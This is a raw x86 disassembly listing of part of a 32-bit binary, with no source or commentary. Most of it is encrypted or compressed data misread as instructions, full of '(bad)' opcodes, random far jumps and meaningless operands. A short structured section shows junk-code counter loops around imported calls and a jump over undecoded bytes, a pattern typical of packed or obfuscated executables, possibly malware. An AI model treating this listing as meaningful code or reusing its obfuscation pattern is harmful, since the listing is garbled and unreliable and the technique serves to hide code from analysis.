  418e5d:	mov    cl,0x84
  418e5f:	call   0x5094a6a6
  418e64:	jo     0x418e5c
  418e66:	adc    al,0xe2
  418e68:	push   ebp
  418e69:	clc    
  418e6a:	sar    bh,0x30
  418e6d:	mov    eax,DWORD PTR [ebp+0x10]
  418e70:	jmp    0x41918a
  418e75:	retf   
  418e76:	rol    dl,cl
  418e78:	(bad)  
  418e79:	(bad)  
  418e7b:	leave  
  418e7c:	shl    DWORD PTR [esi+0x11],1
  418e7f:	(bad)  
  418e81:	add    eax,0xd628a53
  418e86:	sar    BYTE PTR [edi+0x78],0x7b
  418e8a:	jle    0x418f04
  418e8c:	js     0x418ef0
  418e8e:	mov    eax,0x9134d86d
  418e93:	dec    edi
  418e94:	dec    ecx
  418e95:	fwait
  418e96:	ret    
  418e97:	daa    
  418e98:	push   ecx
  418e99:	dec    ecx
  418e9a:	push   ecx
  418e9b:	sbb    al,0x90
  418e9d:	xchg   BYTE PTR [edx+0x2354cc04],dh
  418ea3:	adc    eax,0xfacccb7
  418ea8:	pop    ebx
  418ea9:	lds    ebx,FWORD PTR [ebx]
  418eab:	aam    0xd3
  418ead:	mov    WORD PTR [ecx-0x2848e6a6],es
  418eb3:	xchg   DWORD PTR [esi],eax
  418eb5:	test   BYTE PTR [esi-0x57],bl
  418eb8:	ins    BYTE PTR es:[edi],dx
  418eb9:	pushf  
  418eba:	lea    esi,[ebx+0x19]
  418ebd:	je     0x418eeb
  418ebf:	dec    ecx
  418ec0:	sub    eax,0xc10c4942
  418ec5:	nop
  418ec6:	xlat   BYTE PTR ds:[ebx]
  418ec7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ec8:	pop    ebp
  418ec9:	or     al,0x75
  418ecb:	and    eax,0x1ec28b4e
  418ed0:	and    BYTE PTR [ebp-0x4f],0xb2
  418ed4:	mov    ebx,ebp
  418ed6:	and    eax,0x5a860656
  418edb:	xor    BYTE PTR [ecx+0x1],cl
  418ede:	push   eax
  418edf:	(bad)  
  418ee0:	sar    ah,cl
  418ee2:	and    eax,0xe8076e80
  418ee7:	sub    esp,esi
  418ee9:	or     eax,0xcc143b36
  418eee:	dec    esp
  418eef:	mov    eax,ds:0xbc07d101
  418ef4:	lock dec esp
  418ef6:	in     al,0x66
  418ef8:	fsubr  QWORD PTR [esp+ecx*1-0x4d]
  418efc:	in     al,dx
  418efd:	imul   ebp,DWORD PTR [edi],0x41
  418f00:	les    ebp,FWORD PTR [esi+0x20]
  418f03:	adc    al,0x24
  418f05:	mov    eax,0x13f163cb
  418f0a:	pop    ebx
  418f0b:	hlt    
  418f0c:	jo     0x418f06
  418f0e:	pop    eax
  418f0f:	fsub   DWORD PTR [ebp*1-0x7a7bee84]
  418f16:	push   0x17
  418f18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f19:	popa   
  418f1a:	or     al,BYTE PTR [eax-0x7ef97b51]
  418f20:	leave  
  418f21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f22:	jg     0x418f75
  418f24:	adc    eax,0x7f7c6e42
  418f29:	xchg   ebx,eax
  418f2a:	fisubr WORD PTR [esi+0x2b39efb0]
  418f30:	xchg   DWORD PTR [ebx+0x37],esi
  418f33:	mov    WORD PTR [eax+edx*1],?
  418f36:	imul   edx,DWORD PTR [ebp-0x1e],0xdbbbdef9
  418f3d:	adc    al,0x4e
  418f3f:	enter  0xaf7d,0xf8
  418f43:	jb     0x418f41
  418f45:	jp     0x418f27
  418f47:	xchg   esi,eax
  418f48:	or     BYTE PTR [esi+0x32f1a2e1],0xd
  418f4f:	jb     0x418fb2
  418f51:	aad    0x58
  418f53:	dec    ebx
  418f54:	mov    al,ds:0x91e3423e
  418f59:	aas    
  418f5a:	jns    0x418faa
  418f5c:	nop
  418f5d:	mov    bh,0x36
  418f5f:	sub    esi,DWORD PTR [esi]
  418f61:	and    ch,BYTE PTR [esi+0x47]
  418f64:	les    ebx,FWORD PTR ds:[ebp+0x598b798]
  418f6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f6c:	jae    0x418f5a
  418f6e:	inc    esp
  418f6f:	rcl    DWORD PTR [edi],0x18
  418f72:	cmp    DWORD PTR [ecx],0x58e9b9f
  418f78:	cdq    
  418f79:	aam    0xd9
  418f7b:	arpl   WORD PTR [esi-0x12],si
  418f7e:	mov    DWORD PTR [edi+esi*4+0x383aa0f4],edx
  418f85:	adc    al,0xa
  418f87:	mov    ds:0xd75f6604,al
  418f8c:	push   edx
  418f8d:	std    
  418f8e:	and    al,0xde
  418f90:	or     bh,BYTE PTR [edi+ebx*1+0x68]
  418f94:	call   0x1ae2:0x1a85f441
  418f9b:	xchg   DWORD PTR [eax-0x5e7d2c86],esp
  418fa1:	dec    esp
  418fa2:	push   cs
  418fa3:	idiv   ah
  418fa5:	dec    esp
  418fa6:	repz jb 0x418f6c
  418fa9:	lods   al,BYTE PTR ds:[esi]
  418faa:	add    DWORD PTR [ebx+0x54d3313f],edi
  418fb0:	and    ebx,DWORD PTR [edi+0x68f6fbf1]
  418fb6:	push   0xd3ddfdba
  418fbb:	mov    ah,0x21
  418fbd:	ds iret 
  418fbf:	cmp    al,0x86
  418fc1:	jns    0x419012
  418fc3:	or     al,0xa
  418fc5:	(bad)  
  418fc6:	mov    ch,0x76
  418fc8:	jp     0x418f9e
  418fca:	and    DWORD PTR [eax+0x455d157a],eax
  418fd0:	data16 aaa 
  418fd2:	cld    
  418fd3:	xchg   BYTE PTR [ebp+0x4ebf0e6],ah
  418fd9:	imul   ebx,DWORD PTR [ebx-0x6e],0x1ee97d87
  418fe0:	sahf   
  418fe1:	mov    al,0xf0
  418fe3:	pop    ebp
  418fe4:	xor    BYTE PTR [eax+ebx*2-0x30],al
  418fe8:	mov    eax,DWORD PTR [ecx+0x4cb9da64]
  418fee:	xlat   BYTE PTR ds:[ebx]
  418fef:	cs push esp
  418ff1:	aad    0x43
  418ff3:	inc    eax
  418ff4:	leave  
  418ff5:	mov    ah,0xf5
  418ff7:	push   es
  418ff8:	dec    bp
  418ffa:	mov    dh,0x93
  418ffc:	dec    ebx
  418ffd:	enter  0xc868,0x95
  419001:	pushf  
  419002:	shl    DWORD PTR [ecx],cl
  419004:	or     ecx,DWORD PTR [edx+0x670a4b00]
  41900a:	shl    BYTE PTR [edi-0x7b],0x6c
  41900e:	cmp    BYTE PTR [ebp-0x50e75a99],bl
  419014:	mov    ah,0xf4
  419016:	jmp    0xd7b5:0x350f3ed3
  41901d:	push   cs
  41901e:	and    edx,DWORD PTR [edx]
  419020:	add    ecx,ebx
  419022:	cld    
  419023:	mov    al,0xe7
  419025:	adc    BYTE PTR [eax+0x7b2cbecf],bl
  41902b:	ficomp DWORD PTR [eax+0x3d]
  41902e:	cwde   
  41902f:	test   ebx,0xfb6446ec
  419035:	sbb    BYTE PTR [ecx-0x77],ah
  419038:	bound  esp,QWORD PTR [edi-0x33]
  41903b:	cmp    BYTE PTR [eax],dh
  41903d:	aad    0x4
  41903f:	shr    BYTE PTR [esi],cl
  419041:	das    
  419042:	shld   DWORD PTR [ebp+0x1911f63e],ecx,cl
  419049:	cwde   
  41904a:	aam    0x31
  41904c:	push   ebp
  41904d:	rcr    DWORD PTR [ecx-0x239f5828],cl
  419053:	loopne 0x4190d3
  419055:	das    
  419056:	js     0x4190b9
  419058:	sar    DWORD PTR [ebx+0x78c729b1],1
  41905e:	cmp    edx,DWORD PTR [eax+eax*1-0x74ab000b]
  419065:	inc    esi
  419066:	(bad)  
  419067:	cmp    al,0xbb
  419069:	mov    al,ds:0x77fa2556
  41906e:	adc    al,BYTE PTR [edx+ebp*4-0x472e4ca]
  419075:	or     BYTE PTR [ebp-0x5804d88],bl
  41907b:	adc    DWORD PTR [ecx],0x7ff1de88
  419081:	fmul   QWORD PTR [edx]
  419083:	mov    BYTE PTR [esi+0x5f],0x2f
  419087:	cmp    BYTE PTR [ebx+0x63bf609c],cl
  41908d:	xor    DWORD PTR [edx+0x5ad19007],ebp
  419093:	add    DWORD PTR [eax-0x79803d82],edi
  419099:	mov    ch,ah
  41909b:	jno    0x41911c
  41909d:	aad    0x1c
  41909f:	add    DWORD PTR [eax-0x6e],eax
  4190a2:	cmp    ecx,DWORD PTR [edx+0x7192e6f6]
  4190a8:	add    BYTE PTR [esi+0x68d3c637],bl
  4190ae:	ror    edi,cl
  4190b0:	adc    dl,ch
  4190b2:	xor    eax,0x65a59377
  4190b7:	retf   
  4190b8:	xor    DWORD PTR [esi-0x53],ecx
  4190bb:	rol    BYTE PTR [ebx-0x87f8246],cl
  4190c1:	or     eax,ecx
  4190c3:	mov    cl,BYTE PTR [edi]
  4190c5:	loop   0x419059
  4190c7:	jmp    0x419133
  4190c9:	(bad)  
  4190ca:	jg     0x41909f
  4190cc:	aad    0x6f
  4190ce:	cmp    esp,DWORD PTR [edi+0x233d59cf]
  4190d4:	xlat   BYTE PTR ds:[ebx]
  4190d5:	hlt    
  4190d6:	imul   eax,DWORD PTR [eax],0xfffffff0
  4190d9:	(bad)  
  4190da:	retf   
  4190db:	dec    eax
  4190dc:	or     al,0xb4
  4190de:	or     ch,bh
  4190e0:	sub    esi,ebx
  4190e2:	or     BYTE PTR [esi+0x5b67f945],0xe5
  4190e9:	push   edx
  4190ea:	sbb    dl,0xad
  4190ed:	sbb    bh,BYTE PTR [eax+0x1837d04d]
  4190f3:	mov    edx,0x74fd2d0b
  4190f8:	pushf  
  4190f9:	call   FWORD PTR [edx+eiz*1-0x3f68325a]
  419100:	and    esp,DWORD PTR [ebx+edx*2+0x2e]
  419104:	mov    BYTE PTR [ecx+0x46],0xfe
  419108:	dec    edx
  419109:	mov    DWORD PTR [edi+0x0],ecx
  41910c:	or     DWORD PTR [edi],edi
  41910e:	imul   edx,DWORD PTR [ebp-0x4b3dd233],0xe220e995
  419118:	loop   0x419128
  41911a:	jle    0x419137
  41911c:	add    edx,ebp
  41911e:	push   0x45b20988
  419123:	ins    DWORD PTR es:[edi],dx
  419124:	ss (bad) 
  419126:	lock push es
  419128:	jl     0x41910d
  41912a:	les    ebx,FWORD PTR [edi+0x30]
  41912d:	repz dec esi
  41912f:	sub    DWORD PTR [eax-0x14ae451c],eax
  419135:	jmp    0xa8d5:0xda63b9f6
  41913c:	cmp    al,0x50
  41913e:	shl    edi,1
  419140:	jge    0x41913b
  419142:	pop    edx
  419143:	nop    DWORD PTR [eax+0xbaeca9b]
  41914a:	push   DWORD PTR gs:[eax+edi*1]
  41914e:	pop    esi
  41914f:	ins    BYTE PTR es:[edi],dx
  419150:	sbb    eax,DWORD PTR [ebp+0x276e071b]
  419156:	lahf   
  419157:	lahf   
  419158:	fldenv [ebx+0x66]
  41915b:	sbb    dl,bl
  41915d:	jbe    0x419118
  41915f:	jae    0x41914c
  419161:	call   0x54c2010c
  419166:	mov    bl,0xc5
  419168:	sub    eax,0x62e421f6
  41916d:	jp     0x4191b2
  41916f:	loopne 0x4191d7
  419171:	push   ebx
  419172:	out    0x23,al
  419174:	mov    eax,ds:0x537981f2
  419179:	retf   
  41917a:	test   BYTE PTR [ecx-0x1bef73e0],dl
  419180:	pop    eax
  419181:	loopne 0x4191c6
  419183:	lahf   
  419184:	into   
  419185:	jge    0x4191ab
  419187:	mov    dh,0xc3
  419189:	popa   
  41918a:	call   eax
  41918c:	jmp    0x419194
  419191:	mov    eax,DWORD PTR [ebp+0x10]
  419194:	leave  
  419195:	ret    0xc
  419198:	push   ebp
  419199:	mov    ebp,esp
  41919b:	sub    esp,0x30
  41919e:	jmp    0x4193d3
  4191a3:	rcl    edx,cl
  4191a5:	ret    0xc13e
  4191a8:	into   
  4191a9:	rcl    ecx,cl
  4191ab:	daa    
  4191ac:	jle    0x419228
  4191ae:	mov    ?,WORD PTR [eax]
  4191b0:	inc    edi
  4191b1:	ins    DWORD PTR es:[edi],dx
  4191b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191b3:	or     ch,al
  4191b5:	jg     0x41922f
  4191b7:	adc    BYTE PTR [esi+0x78],bh
  4191ba:	js     0x4191dd
  4191bc:	test   BYTE PTR cs:[ebx-0x7a],bh
  4191c0:	imul   eax,esi,0xffffffad
  4191c3:	pop    esp
  4191c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191c5:	popf   
  4191c6:	repnz imul ebx,DWORD PTR [ebx],0xffffffb5
  4191ca:	pop    ss
  4191cb:	sar    BYTE PTR [edi+esi*2-0x4b523045],1
  4191d2:	xchg   esi,eax
  4191d3:	into   
  4191d4:	sub    BYTE PTR [ebx],0x4a
  4191d7:	scas   al,BYTE PTR es:[edi]
  4191d8:	mov    eax,ds:0xc5f9a5a9
  4191dd:	ret    0x4d99
  4191e0:	sar    DWORD PTR [ebp-0x5418cecf],cl
  4191e6:	jle    0x4191f0
  4191e8:	test   BYTE PTR [ebp-0x27e6a610],dh
  4191ee:	in     al,0xb1
  4191f0:	repz inc esi
  4191f2:	(bad)  
  4191f3:	inc    ecx
  4191f4:	in     al,dx
  4191f5:	mov    edi,esi
  4191f7:	fwait
  4191f8:	mov    dl,0xa3
  4191fa:	xor    eax,0xb579375b
  4191ff:	ret    
  419200:	dec    eax
  419201:	shr    BYTE PTR [edi-0x604e8c79],cl
  419207:	cmp    BYTE PTR [ebp-0x4d],dh
  41920a:	and    BYTE PTR [ecx],dh
  41920c:	sub    DWORD PTR [esi+0x73],esp
  41920f:	cmp    ebx,ebx
  419211:	adc    cl,dl
  419213:	int    0xc4
  419215:	imul   esi,DWORD PTR [eax-0x6e],0xfe236598
  41921c:	fdivr  QWORD PTR [ecx-0x60]
  41921f:	inc    esi
  419220:	sbb    bh,BYTE PTR [edi-0x50]
  419223:	sbb    BYTE PTR [ebx-0x6e],al
  419226:	fcomp  st(5)
  419228:	lods   eax,DWORD PTR ds:[esi]
  419229:	xrelease mov DWORD PTR [esi],ebp
  41922c:	mov    ds:0xbcb1be2a,al
  419231:	jae    0x419237
  419233:	xchg   edx,eax
  419234:	sub    BYTE PTR [ecx],ah
  419236:	inc    eax
  419237:	sbb    al,0x86
  419239:	dec    esi
  41923a:	and    DWORD PTR [ebx],ebp
  41923c:	mov    esp,0x22ab456f
  419241:	xor    eax,0xd18b816a
  419246:	jmp    0x3c14003d
  41924b:	lahf   
  41924c:	push   cs
  41924d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41924e:	retf   
  41924f:	add    al,0xf
  419251:	fcmovu st,st(4)
  419253:	cmp    eax,0xacd4953b
  419258:	shl    edx,cl
  41925a:	xchg   ebp,eax
  41925b:	sbb    DWORD PTR [ebp+0x5d],esi
  41925e:	push   esp
  41925f:	sbb    BYTE PTR [esi+0x6cc85bf7],0x37
  419266:	into   
  419267:	mov    edi,0xeddcf43c
  41926c:	cwde   
  41926d:	jmp    0x1a79:0xea0ff032
  419274:	daa    
  419275:	sahf   
  419276:	leave  
  419277:	adc    al,0x50
  419279:	adc    DWORD PTR [edi+0x45],eax
  41927c:	and    bl,BYTE PTR [eax+0x2d34d497]
  419282:	xchg   ebp,eax
  419283:	daa    
  419284:	pop    eax
  419285:	sub    bh,BYTE PTR ds:0xd8271a2a
  41928b:	dec    esi
  41928c:	loope  0x4192d2
  41928e:	shl    bh,0xb8
  419291:	jmp    0x7aaf:0x5a64da4f
  419298:	scas   eax,DWORD PTR es:[edi]
  419299:	mov    ebx,0x7a81a5d9
  41929e:	jp     0x4192e8
  4192a0:	cld    
  4192a1:	popf   
  4192a2:	adc    BYTE PTR [ebx+edx*8+0x7e64044e],al
  4192a9:	sbb    eax,0x6db1dc32
  4192ae:	inc    ecx
  4192af:	lds    edi,FWORD PTR [ebp-0x31]
  4192b2:	push   ss
  4192b3:	dec    ebp
  4192b4:	push   cs
  4192b5:	mov    esi,ss
  4192b7:	stc    
  4192b8:	loope  0x419309
  4192ba:	add    BYTE PTR [edi+0x2f152bc],bl
  4192c0:	or     DWORD PTR [eax-0x5e6655b1],esi
  4192c6:	inc    ecx
  4192c7:	dec    edi
  4192c8:	mov    DWORD PTR [ebx],edi
  4192ca:	xor    ebx,DWORD PTR [ebp+0x4e]
  4192cd:	stc    
  4192ce:	or     BYTE PTR [ebx+0x4e],0x2
  4192d2:	or     BYTE PTR ss:[ebx],cl
  4192d5:	lahf   
  4192d6:	arpl   WORD PTR [ebx-0x4cf177f],di
  4192dc:	mov    esi,0x58d8b186
  4192e1:	jo     0x419265
  4192e3:	sbb    al,0x1
  4192e5:	jecxz  0x4192bf
  4192e7:	stos   DWORD PTR es:[edi],eax
  4192e8:	push   ebp
  4192e9:	push   ss
  4192ea:	mov    dl,0x75
  4192ec:	int    0x36
  4192ee:	(bad)  
  4192ef:	ins    BYTE PTR es:[edi],dx
  4192f0:	fcmovnb st,st(5)
  4192f2:	pop    esi
  4192f3:	jle    0x4192cd
  4192f5:	ja     0x4192b6
  4192f7:	inc    ebx
  4192f8:	jp     0x4192c0
  4192fa:	rcr    DWORD PTR [eax+0x3b0d2628],0xc6
  419301:	sar    BYTE PTR [eax+eiz*4-0x4c],cl
  419305:	pop    ecx
  419306:	fldcw  WORD PTR [eax-0x63]
  419309:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41930a:	pop    edi
  41930b:	inc    esp
  41930c:	cmp    eax,0xa22c5183
  419311:	inc    esp
  419312:	rcr    DWORD PTR [eax+0x6a],0x2a
  419316:	and    DWORD PTR [edx],edx
  419318:	mov    al,0x71
  41931a:	cmp    bh,BYTE PTR [ebx-0x182ebe36]
  419320:	outs   dx,DWORD PTR ds:[esi]
  419321:	mov    ds:0x5078aca7,eax
  419326:	pop    esi
  419327:	mov    dh,BYTE PTR [ebx]
  419329:	in     eax,0xc4
  41932b:	out    0xd8,al
  41932d:	mov    bh,0xd0
  41932f:	push   0x59cfaf57
  419334:	repz xor DWORD PTR [edi],ecx
  419337:	(bad)  
  419338:	sar    DWORD PTR [edx],1
  41933a:	push   ebp
  41933b:	sti    
  41933c:	ret    
  41933d:	mov    ebp,0x47cc5b46
  419342:	repz loopne 0x419337
  419345:	ror    esp,cl
  419347:	cld    
  419348:	push   cs
  419349:	sbb    eax,0xd8378ba7
  41934e:	aam    0x4f
  419350:	xchg   ebp,eax
  419351:	loopne 0x419382
  419353:	dec    ecx
  419354:	scas   eax,DWORD PTR es:[edi]
  419355:	xlat   BYTE PTR ss:[ebx]
  419357:	and    eax,0x77dd8333
  41935c:	lock xchg ebp,eax
  41935e:	jle    0x41934e
  419360:	and    BYTE PTR [eax+0x6a],bh
  419363:	push   ecx
  419364:	rcl    BYTE PTR [edi+0xb],0x70
  419368:	cli    
  419369:	xor    ch,BYTE PTR [ebp+0x173a4c3e]
  41936f:	mov    DWORD PTR [esi],ecx
  419371:	mov    dl,BYTE PTR [edx+0xf]
  419374:	or     ebp,ebp
  419376:	xchg   esp,eax
  419377:	sub    ah,dl
  419379:	dec    ecx
  41937a:	mov    al,0x9e
  41937c:	aam    0x70
  41937e:	adc    BYTE PTR [ebx+0x47437d47],ch
  419384:	iret   
  419385:	(bad)  
  419386:	cmp    al,0x4e
  419388:	cmp    al,0xfd
  41938a:	pusha  
  41938b:	stos   BYTE PTR es:[edi],al
  41938c:	cld    
  41938d:	mov    ds:0x46ea3ca8,al
  419392:	repz jb 0x4193be
  419395:	cli    
  419396:	jae    0x41936c
  419398:	pop    esi
  419399:	jae    0x41940c
  41939b:	push   0xffffff81
  41939d:	push   0xb579af88
  4193a2:	mov    bl,0xf1
  4193a4:	or     esi,esi
  4193a6:	aad    0xb5
  4193a8:	pop    edi
  4193a9:	call   0x56a21439
  4193ae:	stos   DWORD PTR es:[edi],eax
  4193af:	push   0x43
  4193b1:	mov    edi,0x7c0c8c90
  4193b6:	out    0x8a,eax
  4193b8:	xor    al,0x8e
  4193ba:	or     al,0x21
  4193bc:	fcom   QWORD PTR [ebx+0x3f8041b3]
  4193c2:	adc    dh,BYTE PTR [eax+0x1563df10]
  4193c8:	je     0x419383
  4193ca:	jnp    0x41935a
  4193cc:	adc    BYTE PTR [ecx-0x4686488d],0xd7
  4193d3:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  4193da:	and    DWORD PTR ds:0x42a87d,0x0
  4193e4:	xor    ecx,ecx
  4193e6:	add    ecx,DWORD PTR ds:0x42a87d
  4193ec:	inc    ecx
  4193ed:	mov    DWORD PTR ds:0x42a87d,ecx
  4193f3:	cmp    DWORD PTR ds:0x42a87d,0x24
  4193fa:	jne    0x41940b
  419400:	push   0x4f45
  419405:	call   DWORD PTR ds:0x41d278
  41940b:	cmp    DWORD PTR ds:0x42a87d,0x1b
  419412:	jb     0x4193e4
  419418:	and    DWORD PTR ds:0x42a801,0x0
  419422:	jmp    0x419434
  419427:	mov    ecx,DWORD PTR ds:0x42a801
  41942d:	inc    ecx
  41942e:	mov    DWORD PTR ds:0x42a801,ecx
  419434:	cmp    DWORD PTR ds:0x42a801,0x1d
  41943b:	jae    0x419470
  419441:	cmp    DWORD PTR ds:0x42a801,0x1e
  419448:	jne    0x419461
  41944e:	push   0x42a98f
  419453:	push   DWORD PTR [ebp-0x20]
  419456:	push   0x1
  419458:	push   DWORD PTR [ebp-0xc]
  41945b:	call   DWORD PTR ds:0x41d118
  419461:	jmp    0x419427
  419466:	adc    DWORD PTR ds:0x42a7b1,0x7c2
  419470:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  419477:	and    DWORD PTR ds:0x42a80d,0x0
  419481:	mov    ecx,DWORD PTR ds:0x42a80d
  419487:	inc    ecx
  419488:	mov    DWORD PTR ds:0x42a80d,ecx
  41948e:	cmp    DWORD PTR ds:0x42a80d,0x25
  419495:	jne    0x4194a6
  41949b:	push   0x42aa48
  4194a0:	call   DWORD PTR ds:0x41d27c
  4194a6:	cmp    DWORD PTR ds:0x42a80d,0x18
  4194ad:	jb     0x419481
  4194b3:	mov    ecx,DWORD PTR [ebp-0x4]
  4194b6:	mov    eax,ds:0x42a805
  4194bb:	and    DWORD PTR ds:0x42a775,eax
  4194c1:	push   ebx
  4194c2:	add    ebx,ebx
  4194c4:	mov    eax,0x7510850
  4194c9:	and    DWORD PTR ds:0x42a76d,ecx
  4194cf:	xor    ecx,eax
  4194d1:	movzx  ebx,BYTE PTR ds:0x42a779
  4194d8:	adc    DWORD PTR ds:0x42a871,ebx
  4194de:	mov    ebx,0x327298
  4194e3:	adc    DWORD PTR ds:0x42a761,0x50ad
  4194ed:	add    ecx,ebx
  4194ef:	inc    DWORD PTR ds:0x42a87d
  4194f5:	mov    DWORD PTR [ebp-0x1c],ecx
  4194f8:	mov    ecx,DWORD PTR [ebp+0x14]
  4194fb:	push   esi
  4194fc:	mov    DWORD PTR ds:0x42a7f5,0x238f
  419506:	push   edi
  419507:	test   ecx,ecx
  419509:	mov    DWORD PTR ds:0x42a839,0x1f7e
  419513:	je     0x419758
  419519:	jmp    0x41974e
  41951e:	retf   0xd03c
  419521:	(bad)
  419524:	fld    st(3)
  419526:	scas   eax,DWORD PTR es:[edi]
  419527:	inc    eax
  419528:	adc    DWORD PTR [esi+0x28],eax
  41952b:	into   
  41952c:	inc    edx
  41952d:	test   al,0x20
  41952f:	retf   
  419530:	jg     0x4195aa
  419532:	adc    BYTE PTR [esi+0x78],bh
  419535:	js     0x419513
  419537:	add    DWORD PTR ds:0xbbe2971c,edx
  41953d:	mov    dl,0x3
  41953f:	pop    DWORD PTR [ecx]
  419541:	mov    eax,0x7cf209ec
  419546:	and    eax,0xc1e21c39
  41954b:	into   
  41954c:	fcom   QWORD PTR [eax]
  41954e:	pusha  
  41954f:	dec    esp
  419550:	cmp    ah,BYTE PTR [ebp+0x60]
  419553:	mov    bh,0x5f
  419555:	push   es
  419556:	pop    edi
  419557:	bound  eax,QWORD PTR [edi-0x10]
  41955a:	inc    eax
  41955b:	xor    al,0x89
  41955d:	out    0xf1,eax
  41955f:	pop    es
  419560:	mov    WORD PTR [ebp+eiz*1+0x1494dca7],gs
  419567:	push   esi
  419568:	addr16 cli 
  41956a:	imul   edi,DWORD PTR [ebp-0x70],0x27
  41956e:	adc    DWORD PTR [eax+ecx*2],0xffffff8d
  419572:	xor    al,0xbc
  419574:	fistp  DWORD PTR [eax-0x46]
  419577:	inc    DWORD PTR [eax+ebp*1-0x64c0619]
  41957e:	pop    ebp
  41957f:	xor    dl,BYTE PTR [edx]
  419581:	aam    0xbd
  419583:	and    ebp,DWORD PTR [ebp-0x1c340e5]
  419589:	enter  0xd29f,0x35
  41958d:	adc    eax,0xab8be94d
  419592:	jg     0x4195e6
  419594:	mov    ebx,ecx
  419596:	dec    ebx
  419597:	in     al,0xc9
  419599:	adc    ah,BYTE PTR cs:[eax]
  41959c:	sti    
  41959d:	and    bl,dh
  41959f:	jle    0x4195e1
  4195a1:	mov    dl,0x5b
  4195a3:	data16 mov cl,BYTE PTR [ebx+eiz*4-0x1502bfd7]
  4195ab:	sbb    edi,DWORD PTR [ebp-0x222641e1]
  4195b1:	cmc    
  4195b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195b3:	lods   al,BYTE PTR ds:[esi]
  4195b4:	hlt    
  4195b5:	pop    es
  4195b6:	out    dx,al
  4195b7:	sbb    ah,BYTE PTR [edi+0x680acc2a]
  4195bd:	push   esp
  4195be:	inc    eax
  4195bf:	push   ds
  4195c0:	sbb    al,0xf8
  4195c2:	add    DWORD PTR [ebx+edi*1],edi
  4195c5:	xchg   ebp,eax
  4195c6:	mov    ebx,DWORD PTR [ecx]
  4195c8:	mov    DWORD PTR [edi+0x3],esi
  4195cb:	mov    BYTE PTR [edx+0x6d],bl
  4195ce:	sbb    ebp,DWORD PTR [ecx+0x5e]
  4195d1:	jmp    0x4f9cae91
  4195d6:	or     ebp,edi
  4195d8:	sub    al,0xbc
  4195da:	into   
  4195db:	or     al,0x55
  4195dd:	mov    ch,0x3
  4195df:	mov    ebx,0xe8e72cd3
  4195e4:	fwait
  4195e5:	xor    ah,dh
  4195e7:	xchg   ecx,eax
  4195e8:	sahf   
  4195e9:	mov    al,0x7f
  4195eb:	popa   
  4195ec:	push   esp
  4195ed:	dec    ebx
  4195ee:	imul   edx,DWORD PTR [edi],0xb25cbc35
  4195f4:	enter  0x72a5,0x8
  4195f8:	loopne 0x4195b4
  4195fa:	dec    esp
  4195fb:	pop    esi
  4195fc:	jg     0x4195f7
  4195fe:	and    eax,0x298e6d4f
  419603:	loop   0x419594
  419605:	dec    edi
  419606:	(bad)
  419609:	rcr    DWORD PTR [eax-0x5c21ebf3],0x9f
  419610:	mov    BYTE PTR [esi+edi*4+0xd],bh
  419614:	pop    ecx
  419615:	xchg   ebp,eax
  419616:	mov    ch,0x4f
  419618:	sbb    BYTE PTR [esi],bl
  41961a:	das    
  41961b:	mov    bl,0x64
  41961d:	adc    BYTE PTR [eax+0x72],0x45
  419621:	push   es
  419622:	and    edi,esp
  419624:	xchg   esi,eax
  419625:	jle    0x4195ff
  419627:	sub    al,0x50
  419629:	sbb    dl,bl
  41962b:	push   edi
  41962c:	ret    0x707c
  41962f:	jmp    0x503cec54
  419634:	cmp    al,0x3b
  419636:	cmp    al,BYTE PTR [esi-0x75]
  419639:	ja     0x419648
  41963b:	adc    DWORD PTR [ebx+0x7a],ecx
  41963e:	retf   0x8afe
  419641:	and    dl,bh
  419643:	inc    ebx
  419644:	add    DWORD PTR [edi+eiz*1],edi
  419647:	sbb    al,0xfa
  419649:	imul   eax,DWORD PTR [ebx-0x17b50cc4],0xe8ec7c9b
  419653:	mov    esp,0x46ae51c9
  419658:	jmp    0x419624
  41965a:	cmp    DWORD PTR [eax],esp
  41965c:	mov    dl,0x2a
  41965e:	test   eax,0xa738c57c
  419663:	cmp    BYTE PTR [eax+0x5b4dc333],ah
  419669:	inc    esp
  41966a:	sbb    eax,edi
  41966c:	and    eax,0x88913202
  419671:	shr    edx,cl
  419673:	call   0xb47806a4
  419678:	xor    cl,bl
  41967a:	mov    esi,0x1eef6d11
  41967f:	sar    DWORD PTR [esi-0x247f0f5e],1
  419685:	xlat   BYTE PTR ds:[ebx]
  419686:	je     0x4196d6
  419688:	loop   0x41969d
  41968a:	mov    DWORD PTR [ecx],edi
  41968c:	jge    0x41968e
  41968e:	jle    0x419649
  419690:	loope  0x419683
  419692:	mov    ebx,DWORD PTR [esi+0x7a5da50d]
  419698:	and    al,0xb6
  41969a:	fmul   DWORD PTR [edx-0x3f8a30fd]
  4196a0:	pushf  
  4196a1:	bound  esp,QWORD PTR [edx]
  4196a3:	inc    ebx
  4196a4:	hlt    
  4196a5:	or     dl,BYTE PTR [eax-0x51]
  4196a8:	sub    eax,0xb49c6188
  4196ad:	popf   
  4196ae:	mov    WORD PTR [ecx+0x3e53cd7f],ss
  4196b4:	push   ebx
  4196b5:	jne    0x41970f
  4196b7:	stos   DWORD PTR es:[edi],eax
  4196b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196b9:	mov    eax,0x91d1c39e
  4196be:	jl     0x41971c
  4196c0:	jecxz  0x41965e
  4196c2:	mov    WORD PTR [ecx+ebp*4+0x52eade3c],cs
  4196c9:	cmp    al,0x99
  4196cb:	rcl    DWORD PTR [eax],0x2d
  4196ce:	and    DWORD PTR [edx],edi
  4196d0:	push   0x8c7103e5
  4196d5:	lods   al,BYTE PTR ds:[esi]
  4196d6:	inc    esp
  4196d7:	ror    DWORD PTR [edi],0x60
  4196da:	aam    0x2a
  4196dc:	test   BYTE PTR [ebp-0x2755f99b],al
  4196e2:	push   edi
  4196e3:	mov    al,ds:0x2a60de55
  4196e8:	test   eax,0xea9bf2f2
  4196ed:	repnz loope 0x4196e7
  4196f0:	inc    ebp
  4196f1:	add    eax,DWORD PTR [edi-0x15]
